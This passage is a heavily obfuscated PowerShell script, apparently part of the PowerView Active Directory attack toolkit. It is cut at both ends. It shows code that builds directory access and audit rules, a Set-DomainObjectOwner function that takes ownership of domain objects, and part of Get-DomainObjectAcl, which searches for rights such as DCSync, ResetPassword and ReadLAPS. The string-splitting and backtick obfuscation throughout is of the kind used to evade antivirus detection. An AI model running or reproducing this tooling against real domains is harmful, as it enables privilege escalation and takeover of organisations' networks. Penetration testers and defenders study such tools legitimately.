            if (${psbou`Ndpa`R`AMEt`E`Rs}[("{0}{2}{3}{1}"-f'To','ne','mbst','o')]) { ${pRinC`i`p`ALsE`ArcH`ERaRGUme`Nts}[("{0}{1}" -f 'Tombs','tone')] = ${TOmBst`O`Ne} }
            if (${psbOu`Nd`p`Ara`Met`erS}[("{2}{1}{0}"-f'al','nti','Crede')]) { ${pR`iNCIP`ALSeaR`c`hE`RarguMents}[("{2}{1}{0}" -f'tial','reden','C')] = ${CR`Ed`en`TIAl} }
            ${P`RIN`CIPAL} = &("{1}{0}{2}{3}"-f 't','Ge','-Dom','ainObject') @PrincipalSearcherArguments
            if (-not ${Prin`cIP`AL}) {
                throw ('Unable'+' '+'t'+'o '+'re'+'solve '+'p'+'ri'+'ncipal'+': '+"$PrincipalIdentity")
            }
            elseif(${pr`I`NciPaL}."C`OuNt" -gt 1) {
                throw ("{2}{8}{17}{5}{12}{13}{16}{1}{4}{14}{0}{9}{7}{10}{3}{11}{6}{15}{18}"-f 'obj','ip','Pri',' one i','le','nt',' allo',', but','nc','ects',' only','s','ity matc','hes ',' AD ','we','mult','ipalIde','d')
            }
            ${oB`jEC`TSiD} = ${p`Rinci`PAL}."o`B`jEctsID"
        }
        else {
            ${OB`j`ectsID} = ${PrIn`c`i`pALI`denTItY}
        }

        ${AD`RIg`hT} = 0
        foreach(${r} in ${r`ighT}) {
            ${ADrIG`hT} = ${a`dri`Ght} -bor (([System.DirectoryServices.ActiveDirectoryRights]${R})."vA`LUe__")
        }
        ${adr`I`GHT} = [System.DirectoryServices.ActiveDirectoryRights]${ADrI`gHT}

        ${idE`N`TI`TY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${o`BJeCTS`id})
    }

    Process {
        if(${Ps`c`MDlET}.paramETErsetnAMe -eq ("{2}{0}{1}{3}" -f'ditR','uleTy','Au','pe')) {

            if(${O`BJec`TTy`Pe} -eq ${nU`Ll} -and ${i`NhEri`T`ANceT`yPe} -eq  ( vaRiABLe  ("KdL"+"p")  )."V`Alue"::"E`mpty" -and ${InHe`R`i`TEdObj`eC`TTy`PE} -eq ${n`ULL}) {
                &("{2}{3}{0}{1}" -f'Obje','ct','N','ew-') ("{11}{0}{4}{12}{8}{1}{2}{7}{3}{6}{9}{10}{5}"-f'ystem.','er','v','Act','D','oryAuditRule','iveDi','ices.','ctoryS','rec','t','S','ire') -ArgumentList ${ID`e`NtitY}, ${ad`Ri`ght}, ${AUd`ITFl`AG}
            } elseif(${OB`jE`cTty`pe} -eq ${nu`Ll} -and ${inH`ERitAN`c`e`TYPe} -ne  ( Item  ("{4}{2}{1}{0}{3}"-f'KDl','BlE:','rIa','P','vA') )."VA`LUe"::"Emp`Ty" -and ${inhe`R`I`TEdoBJe`CTtYPe} -eq ${N`ULl}) {
                &("{1}{0}{2}{3}"-f'ew-O','N','b','ject') ("{1}{10}{9}{8}{6}{2}{0}{3}{11}{5}{7}{4}"-f'tiveDi','Sy','ces.Ac','r','ule','oryAudi','ryServi','tR','o','Direct','stem.','ect') -ArgumentList ${Id`ent`ity}, ${aDr`Ig`HT}, ${Au`DI`TFl`Ag}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${inHeriT`A`NCe`TyPE})
            } elseif(${Ob`j`EcTtyPe} -eq ${n`Ull} -and ${IN`H`ERi`TaNcetYPe} -ne   (VaRIABle  ("{1}{0}" -f 'DLp','K')  )."v`ALue"::"Em`pTy" -and ${iNHEr`i`TeD`OBJ`E`ct`Type} -ne ${n`ULl}) {
                &("{1}{2}{0}" -f't','New-Obje','c') ("{9}{0}{5}{7}{3}{2}{8}{6}{4}{1}"-f'em.Dir','Rule','ices.Ac','v','dit','ectorySe','eDirectoryAu','r','tiv','Syst') -ArgumentList ${i`d`eNtIty}, ${A`dRIg`HT}, ${aud`iTF`Lag}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${inH`E`RiT`AN`Cety`PE}), ${InHeRI`TeD`objeCtT`YPe}
            } elseif(${obJe`cTT`ype} -ne ${N`ULl} -and ${I`NHerI`T`A`NceTyPE} -eq  ${kD`LP}::"em`PTY" -and ${INHeRi`TeDo`B`j`ecTTYpE} -eq ${nu`LL}) {
                &("{1}{2}{0}" -f'ect','New-O','bj') ("{2}{11}{4}{1}{9}{8}{10}{0}{5}{7}{3}{6}{12}" -f 'to','ic','System.Dir','t','rv','ryAud','R','i','ctiveDire','es.A','c','ectorySe','ule') -ArgumentList ${i`DEnTITy}, ${a`dRiG`ht}, ${Aud`iTf`lAg}, ${O`BJE`CTTyPe}
            } elseif(${O`BjeCt`T`YpE} -ne ${NU`Ll} -and ${in`he`RI`TA`NceTypE} -ne   ${K`Dlp}::"eM`pTy" -and ${I`Nh`eRITEDO`Bj`ec`Tty`Pe} -eq ${n`ULL}) {
                &("{1}{0}{2}" -f'w-','Ne','Object') ("{5}{6}{0}{4}{1}{9}{3}{8}{11}{2}{10}{7}" -f'D','ctoryServices.','i','tor','ire','Sy','stem.','ule','y','ActiveDirec','tR','Aud') -ArgumentList ${ID`En`TItY}, ${AD`R`iGhT}, ${AUDIt`F`laG}, ${O`BjEc`TTy`Pe}, ${INH`eRit`A`N`CETyPE}
            } elseif(${O`B`jECTt`YpE} -ne ${NU`Ll} -and ${InHeR`It`A`Nc`ety`Pe} -ne  (GET-vaRiabLE  ("{1}{0}"-f'p','KDl')  -VaLuEo  )::"e`MPtY" -and ${inH`eRI`TEdO`BJecTtyPe} -ne ${NU`LL}) {
                &("{1}{2}{0}"-f 't','New-Obje','c') ("{12}{7}{2}{4}{1}{8}{6}{0}{5}{3}{9}{10}{11}"-f 'tory','rectorySer','tem.','u','Di','A','c','s','vices.ActiveDire','d','itR','ule','Sy') -ArgumentList ${id`eNT`i`Ty}, ${adR`ig`Ht}, ${AUd`i`TF`lAG}, ${oB`jecT`T`ype}, ${iN`he`RiTAN`CeTYpe}, ${InHERITEDOB`J`ecT`T`YPe}
            }

        }
        else {

            if(${Objec`T`Ty`pe} -eq ${Nu`ll} -and ${IN`HeRiTAnc`eT`Y`Pe} -eq   (  LS  ('vARi'+'ABle'+':'+'kDLP') )."v`AlUE"::"eM`Pty" -and ${In`heRI`T`ED`o`BjecttyPE} -eq ${Nu`lL}) {
                &("{2}{1}{0}" -f 'w-Object','e','N') ("{10}{8}{6}{0}{11}{13}{7}{2}{14}{1}{12}{3}{9}{4}{5}" -f 'rector','ory','s.A','es','ul','e','m.Di','ice','e','sR','Syst','yS','Acc','erv','ctiveDirect') -ArgumentList ${IDENT`ItY}, ${A`DRi`gHt}, ${a`CC`esS`cOnTROLTy`PE}
            } elseif(${O`B`JEC`Ttype} -eq ${N`Ull} -and ${I`NhErit`AN`CEt`Y`pe} -ne   ${k`dLP}::"Em`pty" -and ${i`NHEr`It`E`d`ObJectTYPE} -eq ${n`UlL}) {
                &("{0}{1}{2}" -f 'N','ew-Obj','ect') ("{6}{3}{2}{0}{1}{7}{4}{5}{8}"-f'ryS','erv','cto','ystem.Dire','ctive','DirectoryAcce','S','ices.A','ssRule') -ArgumentList ${Id`EntITy}, ${AdriG`HT}, ${AC`cE`S`scoN`TROlty`Pe}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${In`hERI`TaNc`ETy`Pe})
            } elseif(${OBj`Ec`T`TyPE} -eq ${nU`LL} -and ${INHE`R`iTancE`T`YPe} -ne  (Ls ("{2}{3}{0}{1}{4}" -f 'lE:','k','VaRI','Ab','dLp'))."va`LuE"::"E`MPtY" -and ${inHerI`Ted`oBjEc`TT`ypE} -ne ${nU`ll}) {
                &("{2}{0}{1}" -f 'w-','Object','Ne') ("{4}{0}{9}{8}{1}{6}{11}{12}{3}{7}{5}{10}{2}" -f 'r','veD','Rule','tor','System.DirectorySe','Acc','i','y','ices.Acti','v','ess','re','c') -ArgumentList ${ideNt`i`TY}, ${Ad`Ri`GHT}, ${aCcesScontR`O`Lt`YpE}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${IN`HERi`Tanc`Et`yPE}), ${I`NHER`it`ed`O`BjE`ctTYPe}
            } elseif(${o`BjeCtT`ype} -ne ${nu`ll} -and ${iN`h`eRItAnce`T`yPE} -eq  (  VarIABle ("{1}{0}" -f 'p','KDL')  )."va`lUe"::"E`Mpty" -and ${iNHeR`I`Te`doBJ`eC`T`TYpe} -eq ${n`ULL}) {
                &("{2}{0}{1}" -f 'Obje','ct','New-') ("{8}{14}{13}{0}{12}{10}{5}{11}{1}{2}{9}{7}{6}{4}{3}" -f'ory','s.ActiveDi','r','ule','sR','c','s','yAcce','Sy','ector','rvi','e','Se','ct','stem.Dire') -ArgumentList ${IDE`N`Tity}, ${ad`RiG`HT}, ${accEs`SC`oNT`RoLTYpe}, ${Obje`c`TtY`pE}
            } elseif(${ObJec`TT`YPE} -ne ${n`ULL} -and ${iNHERI`TAn`cEtype} -ne  ${K`dLP}::"eM`pTY" -and ${i`NhERi`TeD`oBJect`TyPe} -eq ${N`UlL}) {
                &("{3}{2}{1}{0}"-f'ect','bj','O','New-') ("{2}{5}{8}{10}{6}{0}{4}{9}{3}{11}{1}{7}" -f'rvice','ssRul','Syst','y','s.A','em.Dire','ySe','e','c','ctiveDirector','tor','Acce') -ArgumentList ${Ide`N`Ti`Ty}, ${Ad`RiGHt}, ${ACce`ssCo`Nt`ROL`Type}, ${ObjE`CTTY`PE}, ${I`NHeri`TAnCe`TYpE}
            } elseif(${OBj`e`CTtYpe} -ne ${N`ULl} -and ${I`N`h`e`RITaNcetyPE} -ne   (LS  ("VA"+"RiAb"+"le:KDLP") )."vA`LuE"::"E`mPty" -and ${Inh`ER`itEdOb`jEC`TT`yPe} -ne ${NU`Ll}) {
                &("{0}{2}{1}"-f 'New','ject','-Ob') ("{1}{0}{2}{8}{10}{9}{12}{4}{7}{11}{6}{5}{3}" -f'st','Sy','em.','sRule','yServi','cces','yA','ces.ActiveDir','Dire','to','c','ector','r') -ArgumentList ${I`DenT`Ity}, ${ADri`GhT}, ${AcC`EsSco`NTr`OltYPe}, ${oBj`ECtt`ypE}, ${inH`E`Ritan`ce`TyPe}, ${inhe`R`I`TedObjEct`TYpe}
            }

        }
    }
}


function SeT-DOmAInObJ`E`C`TOW`N`ER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{8}{6}{3}{7}{5}{4}{2}{1}{9}" -f'PSUseSh','on','i','sF','teChangingFunct','ta','ces','orS','ouldPro','s'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{1}{4}" -f'd','e','PSShoul','Proc','ss'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POsitIon = 0, MANDatOry = ${tr`UE}, valueFROMPipelInE = ${tR`Ue}, valUefrOMPiPElInEbYpROpERtYname = ${t`Rue})]
        [Alias({"{1}{2}{4}{0}{3}" -f 'nguished','D','i','Name','sti'}, {"{1}{0}{2}"-f 'ntNam','SamAccou','e'}, {"{1}{0}" -f'ame','N'})]
        [String]
        ${ID`E`NtiTy},

        [Parameter(MAndaTORy = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'Own','er'})]
        [String]
        ${oWNeri`de`NtIty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`m`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'er','Filt'})]
        [String]
        ${l`Dapf`ILTER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'A','SPath','D'})]
        [String]
        ${se`ArchbA`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{3}" -f'Dom','ainContro','ll','er'})]
        [String]
        ${SEr`V`ER},

        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{0}{1}{2}" -f 'O','neLev','el'}, {"{1}{0}" -f'btree','Su'})]
        [String]
        ${S`EA`RCHSCO`Pe} = ("{2}{0}{1}" -f 'tre','e','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsuL`TPa`GesIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RV`e`RTIMEli`MIt},

        [Switch]
        ${T`om`B`sToNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`EDEn`TiAl} =   (Ls  ("{3}{1}{4}{0}{2}"-f'7t','l','q02','VaRiAb','e:') )."vAL`UE"::"Emp`TY"
    )

    BEGIN {
        ${SeA`RchErAR`G`U`mEN`Ts} = @{}
        if (${pSbOunD`pa`RamETe`RS}[("{0}{1}" -f 'Domai','n')]) { ${s`eAr`chERARGUmE`NtS}[("{0}{1}"-f'D','omain')] = ${dOM`A`IN} }
        if (${pSb`oUn`DPAr`AmeT`ErS}[("{1}{2}{0}" -f 'r','LDAP','Filte')]) { ${sEaRchEr`ARG`UmE`NTS}[("{1}{3}{0}{2}"-f 'ilt','L','er','DAPF')] = ${LDApF`IL`TEr} }
        if (${pSB`oUND`pa`Ra`metErS}[("{2}{0}{1}" -f 'Bas','e','Search')]) { ${SEa`R`C`hErArGUm`eNTs}[("{2}{0}{1}"-f 'ar','chBase','Se')] = ${s`EaR`CHBA`Se} }
        if (${psbOundp`A`RAmEtE`RS}[("{0}{1}{2}" -f 'S','erve','r')]) { ${SE`A`RchERArG`UmEnts}[("{1}{0}{2}"-f'rve','Se','r')] = ${se`RV`Er} }
        if (${pSb`Ou`NDPa`RAMe`TErs}[("{2}{1}{3}{0}"-f'Scope','c','Sear','h')]) { ${S`EarcH`erarGUME`Nts}[("{0}{3}{2}{1}"-f 'S','chScope','ar','e')] = ${S`EArchsc`OPE} }
        if (${psbO`UNDp`A`RaMe`TErS}[("{2}{0}{1}{3}"-f 'esul','tP','R','ageSize')]) { ${SearCHe`Rar`G`UMe`NTs}[("{3}{2}{0}{1}"-f'Page','Size','sult','Re')] = ${R`esu`ltPAges`IZe} }
        if (${PSB`OU`NDpaRA`Met`E`Rs}[("{0}{2}{1}"-f 'ServerTimeL','it','im')]) { ${SE`AR`C`HER`A`RgUMEntS}[("{0}{1}{2}{3}" -f 'S','erverTime','Limi','t')] = ${se`R`VertIMe`L`ImIt} }
        if (${P`s`BOundP`ARa`mEtErs}[("{0}{1}" -f'Tom','bstone')]) { ${se`ARC`hER`ARg`UmentS}[("{0}{1}" -f 'Tombston','e')] = ${tO`m`BS`TONE} }
        if (${p`Sbou`ND`P`ARaM`eteRS}[("{0}{2}{1}" -f 'C','ial','redent')]) { ${sEArcH`E`RARgum`En`TS}[("{0}{1}{2}" -f 'Cred','ent','ial')] = ${crE`d`ENt`IaL} }

        ${ow`N`ersID} = &("{2}{4}{1}{3}{0}" -f't','Obje','Get-Doma','c','in') @SearcherArguments -Identity ${O`w`Neri`d`eNtiTY} -Properties ("{1}{2}{0}"-f'ectsid','ob','j') | &("{1}{0}{3}{2}"-f'ect-Obj','Sel','t','ec') -ExpandProperty ("{1}{0}" -f 'sid','object')
        if (${oW`NER`Sid}) {
            ${oW`N`EridENt`IT`yr`E`FerEN`Ce} = [System.Security.Principal.SecurityIdentifier]${OwNER`S`iD}
        }
        else {
            &("{1}{2}{0}"-f 'ning','Write-','War') ('[Set-Dom'+'a'+'in'+'Objec'+'tOwner] '+'Error'+' '+'par'+'si'+'ng '+'own'+'er '+'i'+'dent'+'ity '+"'$OwnerIdentity'")
        }
    }

    PROCESS {
        if (${O`wnErideNTITYRe`F`ER`ENCE}) {
            ${SearcHE`RAR`gU`MEnTs}['Raw'] = ${TR`UE}
            ${SEaRC`H`ERARg`UmeNts}[("{2}{0}{1}" -f'de','ntity','I')] = ${iDe`NT`ity}

            
            ${r`AW`OBjECT} = &("{2}{3}{1}{0}" -f'ect','-DomainObj','Ge','t') @SearcherArguments

            ForEach (${o`B`jeCt} in ${Ra`WOb`JecT}) {
                try {
                    &("{0}{3}{2}{1}"-f'Write-Ver','se','o','b') ('[Set-'+'Dom'+'ainO'+'bject'+'O'+'wner] '+'Att'+'e'+'mpting'+' '+'t'+'o '+'se'+'t '+'t'+'he '+'o'+'wner '+'for'+' '+"'$Identity' "+'t'+'o '+"'$OwnerIdentity'")
                    ${e`Nt`Ry} = ${RAwob`Je`CT}.("{3}{2}{1}{0}"-f'Entry','rectory','Di','Get').Invoke()
                    ${e`Nt`RY}."PS`B`Ase"."oPT`Io`Ns"."S`EcURITYmA`S`kS" = ("{0}{1}" -f'Own','er')
                    ${eN`TRY}."p`sbase"."obJEC`TSEcU`RI`Ty".("{0}{1}"-f'SetO','wner').Invoke(${ow`N`eRi`d`entI`TYrE`FeRENcE})
                    ${e`NtRY}."p`sBaSE".("{1}{2}{3}{0}" -f'es','C','ommi','tChang').Invoke()
                }
                catch {
                    &("{4}{1}{0}{2}{3}" -f 'it','r','e-Warni','ng','W') ('[Se'+'t-'+'D'+'oma'+'inO'+'bjectOwne'+'r] '+'Error'+' '+'se'+'tting '+'owne'+'r: '+"$_")
                }
            }
        }
    }
}


function gEt`-`d`OmaiNObJEc`T`A`CL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}"-f'PSShouldProc','es','s'}, '')]
    [OutputType({"{3}{1}{2}{0}" -f'L','werView.A','C','Po'})]
    [CmdletBinding()]
    Param (
        [Parameter(POsitIoN = 0, vAluEFRoMPipELINe = ${tr`Ue}, VALueFroMPIpElINEBYprOPERTYnamE = ${t`RuE})]
        [Alias({"{1}{4}{0}{2}{3}"-f 'nguishe','Di','dN','ame','sti'}, {"{3}{0}{1}{4}{2}"-f 'c','cou','ame','SamA','ntN'}, {"{0}{1}"-f'Nam','e'})]
        [String[]]
        ${i`deNTITY},

        [Switch]
        ${S`Acl},

        [Switch]
        ${rEso`lVe`GUi`Ds},

        [String]
        [Alias({"{2}{0}{1}" -f'ig','hts','R'})]
        [ValidateSet('All', {"{0}{2}{1}"-f 'Rese','assword','tP'}, {"{2}{1}{0}"-f 's','teMember','Wri'}, {"{1}{2}{0}" -f 'c','DCS','yn'}, {"{0}{2}{3}{1}"-f 'Al','ded','lEx','ten'}, {"{0}{2}{1}" -f 'Re','dLAPS','a'})]
        ${Ri`g`htsfIlt`Er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`Ma`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'lter','Fi'})]
        [String]
        ${ld`A`pFil`TER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'Path','A','DS'})]
        [String]
        ${SeARchb`A`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}"-f 'i','Doma','nCo','ntroller'})]
        [String]
        ${s`e`Rver},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{0}{1}" -f'OneL','evel'}, {"{1}{0}" -f'ree','Subt'})]
        [String]
        ${sEArC`H`S`Cope} = ("{1}{0}"-f'ubtree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`Sul`Tpag`Es`IZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ERv`eRti`M`ELIMIT},

        [Switch]
        ${To`M`BsTONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRed`eN`T`IAl} =   ${7Tq02}::"e`mpty",

        [Switch]
        ${S`sL},

        [Switch]
        ${O`B`FuScATE}
    )

    BEGIN {
        ${SeArcH`Er`ARgum`entS} = @{
            ("{2}{0}{1}"-f 'i','es','Propert') = ("{14}{11}{15}{5}{7}{4}{13}{16}{12}{0}{18}{10}{17}{1}{6}{2}{9}{3}{8}" -f't','stinguis','m','ec','ts','ntname','hedna',',n','tsid','e,obj','escriptor','co','ri','ec','samac','u','u',',di','yd')
        }

        if (${p`SBo`UNDPAR`AmET`e`Rs}[("{1}{0}"-f 'acl','S')]) {
            ${SearChEr`A`R`GUMENtS}[("{1}{3}{0}{2}" -f 'urityMa','Se','sks','c')] = ("{0}{1}"-f'Sac','l')
        }
        else {
            ${SEA`RchE`R`Ar`guMeNts}[("{1}{2}{0}"-f'rityMasks','S','ecu')] = ("{0}{1}" -f 'D','acl')
        }
        if (${PSB`ou`NdPAram`ETe`Rs}[("{1}{0}" -f'in','Doma')]) { ${s`e`ArcherA`RG`UM`ents}[("{2}{0}{1}"-f'ai','n','Dom')] = ${DO`m`Ain} }
        if (${P`sb`o`UND`pArA`MeteRs}[("{2}{1}{0}" -f 'e','chBas','Sear')]) { ${sEA`RC`HeRarg`UMeN`Ts}[("{0}{2}{1}"-f 'Se','chBase','ar')] = ${sEar`C`h`BasE} }
        if (${pSb`ouN`DparAmeTe`RS}[("{0}{2}{1}" -f'Se','er','rv')]) { ${SE`Ar`CHER`AR`GUm`eNTs}[("{0}{1}"-f'Se','rver')] = ${Se`RvEr} }
        if (${Ps`BoUND`PAr`AmEtERs}[("{2}{1}{3}{0}"-f'e','o','SearchSc','p')]) { ${se`A`RChERaRGU`M`EnTS}[("{1}{0}{2}"-f'earchSco','S','pe')] = ${S`EaRC`Hsc`Ope} }
        if (${pS`Bo`UnDPar`AM`Et`ErS}[("{2}{1}{0}"-f'geSize','tPa','Resul')]) { ${s`EaRChe`RAR`G`UMEN`Ts}[("{1}{2}{3}{0}"-f 'ze','ResultP','a','geSi')] = ${rEs`U`ltP`AGesize} }
        if (${P`SBo`U`NdpaR`AmETerS}[("{2}{4}{0}{1}{3}" -f 'me','Limi','Ser','t','verTi')]) { ${Sea`RcHE`RArg`U`mENtS}[("{2}{3}{0}{1}" -f 'er','TimeLimit','Ser','v')] = ${Se`R`VErTime`l`IMiT} }
        if (${PsBO`UNDPa`RA`meT`ErS}[("{0}{2}{1}" -f'Tom','tone','bs')]) { ${SE`ARCHERARgu`m`EnTs}[("{1}{0}{2}"-f 'ombston','T','e')] = ${T`ombsTO`Ne} }
        if (${p`SB`ound`P`ARameTERs}[("{0}{1}{2}"-f'Credenti','a','l')]) { ${SeaR`Ch`E`RAR`GuMentS}[("{1}{2}{0}{3}" -f'de','Cr','e','ntial')] = ${crEDe`NTi`Al} }
        if (${psB`Ound`para`m`Ete`RS}['SSL']) { ${SEa`Rc`HERARG`U`m`EnTS}['SSL'] = ${S`sL} }
        if (${PSB`ouNDpaR`A`Met`erS}[("{1}{0}"-f'ate','Obfusc')]) {${seARchERA`R`GuME`N`Ts}[("{0}{2}{1}" -f'Ob','ate','fusc')] = ${Ob`FUSc`ATe} }
        ${sE`A`Rc`Her} = &("{4}{2}{0}{3}{1}" -f'main','r','Do','Searche','Get-') @SearcherArguments

        ${DO`ma`INGu`idmaPar`Gu`me`Nts} = @{}
        if (${pSBOUnD`PAr`Am`EtE`Rs}[("{0}{1}"-f 'Dom','ain')]) { ${dO`mAinguIdMAParguM`en`Ts}[("{2}{0}{1}"-f'a','in','Dom')] = ${D`O`mAIn} }
        if (${PSBO`Un`dp`ArAMe`T`ERS}[("{1}{0}"-f 'er','Serv')]) { ${d`OMA`i`N`gUidmA`parGUM`EnTS}[("{1}{0}"-f 'r','Serve')] = ${S`ERv`eR} }
        if (${p`SboUnDp`Ar`AmetERs}[("{2}{1}{0}{3}" -f 'i','S','ResultPage','ze')]) { ${DomAi`N`GU`IdMaP`AR`GUMEntS}[("{2}{3}{0}{1}"-f 'eSi','ze','Resul','tPag')] = ${ReSU`l`TPa`Gesi`ze} }
        if (${P`S`BOund`p`ARamE`TeRs}[("{1}{3}{2}{4}{0}" -f'Limit','S','erTi','erv','me')]) { ${domaINGUIdM`Ap`A`R`GUMEnTS}[("{1}{3}{2}{0}{4}" -f'i','Ser','rTimeLim','ve','t')] = ${seRvERTi`ME`Li`mit} }
        if (${Psbo`UND`p`Ar`A`Meters}[("{2}{1}{0}" -f 'ntial','e','Cred')]) { ${dOMaInGUiD`m`ApARG`UMeNtS}[("{0}{1}{2}" -f 'Cre','de','ntial')] = ${C`R`edeNTi`Al} }
        if (${psbOu`NDp`AR`Am`eTerS}['SSL']) { ${DOMa`iNGUiDma`P`A`R`guME`Nts}['SSL'] = ${s`sl} }

        
        if (${PSb`OUNd`p`AraME`Te`Rs}[("{1}{0}{2}"-f 'so','Re','lveGUIDs')]) {
            ${Gu`i`Ds} = &("{1}{3}{0}{2}" -f't-','G','DomainGUIDMap','e') @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if (${SEaRch`eR}) {
            ${IdeNTi`T`y`FiLTER} = ''
            ${F`ILt`er} = ''
            ${iD`EnTItY} | &("{3}{2}{0}{1}" -f 'e-Obje','ct','er','Wh') {${_}} | &("{4}{3}{2}{1}{0}" -f 'ject','b','-O','rEach','Fo') {
                ${ideN`T`iTyiNst`A`NCE} = ${_}.("{0}{1}" -f 'R','eplace').Invoke('(', '\28').("{1}{2}{0}"-f 'e','R','eplac').Invoke(')', '\29')
                if (${IDe`NTItYinSt`An`cE} -match ("{0}{1}{2}"-f '^','S-1-','.*')) {
                    ${i`dEnTiT`yfil`T`eR} += "(objectsid=$IdentityInstance)"
                }
                elseif (${idEn`T`ItyiNSTa`NCE} -match ((("{2}{0}{1}{3}"-f 'OUBTsD','C)=','^(CNBTs','.*')) -RePLACE([char]66+[char]84+[char]115),[char]124)) {
                    ${I`DeNTItYf`iLt`Er} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PS`BoUNd`Pa`RamEt`ERS}[("{0}{1}{2}"-f'D','om','ain')]) -and (-not ${ps`BoUNdP`A`RAMete`RS}[("{1}{2}{0}"-f'se','S','earchBa')])) {
                        
                        
                        ${idE`NtITY`D`oMAiN} = ${I`dEn`T`iTYINstan`Ce}.("{2}{3}{1}{0}" -f 'ng','ri','Sub','St').Invoke(${iD`en`Ti`TYInSTAnce}.("{0}{1}"-f'Ind','exOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{3}{4}{0}{1}" -f'-Verbos','e','Wr','i','te') ('['+'Get'+'-D'+'omain'+'ObjectA'+'cl]'+' '+'Ext'+'racted'+' '+'d'+'omain '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${s`e`ARc`H`eraRG`UmENts}[("{0}{1}"-f'Dom','ain')] = ${idenTIt`Y`D`oMaIN}
                        ${seaR`CH`Er} = &("{0}{3}{2}{1}{4}"-f 'Get','e','rch','-DomainSea','r') @SearcherArguments
                        if (-not ${SE`Arc`heR}) {
                            &("{2}{1}{0}" -f'ing','-Warn','Write') ('[Get-Do'+'ma'+'inO'+'bjec'+'tAcl'+'] '+'Un'+'able'+' '+'to'+' '+'retr'+'ieve '+'do'+'main'+' '+'search'+'er '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${iDeNti`T`YI`NStAn`ce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${gu`ID`ByTeS`TR`InG} = (([Guid]${idE`N`T`ITyI`NStancE}).("{0}{3}{1}{2}"-f'ToByt','r','ay','eAr').Invoke() | &("{0}{3}{2}{1}" -f 'Fo','bject','h-O','rEac') { '\' + ${_}.("{1}{0}" -f 'ng','ToStri').Invoke('X2') }) -join ''
                    ${I`DEn`Tityfi`lteR} += "(objectguid=$GuidByteString)"
                }
                elseif (${iD`eNtITyin`s`Ta`NCE}.("{2}{0}{1}" -f 'ain','s','Cont').Invoke('.')) {
                    ${ID`eNTit`YFIltER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${I`den`T`itY`FiltER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${IdEN`TitYf`ILT`ER} -and (${I`dENTIt`YFi`LT`ER}.("{0}{1}" -f'Tr','im').Invoke() -ne '') ) {
                ${F`I`lTer} += "(|$IdentityFilter)"
            }

            if (${P`s`BounDpa`R`Amet`erS}[("{1}{2}{0}"-f'Filter','LDA','P')]) {
                &("{1}{0}{2}"-f 'Ve','Write-','rbose') ('[G'+'et-Domain'+'Object'+'A'+'c'+'l'+'] '+'Us'+'in'+'g '+'add'+'i'+'tio'+'nal '+'LDAP'+' '+'fi'+'lte'+'r: '+"$LDAPFilter")
                ${FIL`T`er} += "$LDAPFilter"
            }

            if (${FI`l`TER}) {
                ${fIl`TeR} = "(&$Filter)"
            }
            &("{2}{1}{0}"-f'ose','te-Verb','Wri') "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Filter) "

            
            if (${fIL`T`eR} -and ${f`IlTEr} -ne '') {
                ${SeaRC`H`eraRGu`MEnts}[("{2}{1}{0}"-f'ilter','PF','LDA')] = "$Filter"
            }
            ${RE`sU`lTs} = &("{2}{0}{1}{3}"-f 'APQ','uer','Invoke-LD','y') @SearcherArguments
            ${r`EsUlts} | &("{0}{2}{1}" -f'Where','ject','-Ob') {${_}} | &("{0}{3}{2}{1}" -f'For','t','ach-Objec','E') {
                if (&("{2}{1}{0}"-f 'ember','-M','Get') -inputobject ${_} -name ("{0}{1}{2}"-f'At','tr','ibutes') -Membertype ("{2}{3}{1}{0}" -f 'ies','t','Prope','r')) {
                    ${O`BjE`Ct} = @{}
                    foreach (${A} in ${_}."aTtR`i`BUtEs"."K`eys" | &("{1}{2}{0}{3}"-f 'rt-Ob','S','o','ject')) {
                        &("{3}{2}{1}{0}"-f'put','Out','te-','Wri') ('TE'+'ST: '+"$a")
                        if ((${A} -eq ("{0}{1}{2}"-f'obje','c','tsid')) -or (${A} -eq ("{2}{1}{0}{3}" -f'h','id','s','istory')) -or (${a} -eq ("{3}{0}{1}{2}" -f 'bjectg','u','id','o')) -or (${A} -eq ("{1}{2}{3}{0}" -f 'ertificate','u','se','rc')) -or (${a} -eq ("{2}{0}{3}{4}{1}"-f 'i','r','ntsecuritydescr','p','to'))) {
